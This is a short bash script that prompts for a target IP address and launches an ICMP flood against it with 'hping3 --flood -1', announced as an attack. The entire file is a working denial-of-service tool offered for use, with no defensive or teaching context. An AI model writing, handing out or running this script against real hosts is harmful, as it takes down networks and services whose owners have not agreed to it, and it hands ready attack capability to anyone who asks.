#!/bin/bash


echo "Enter the IP address of your target : (ICMP Method One) "

read varIP

echo "Launching attack..."

sudo hping3 --flood -1 $varIP
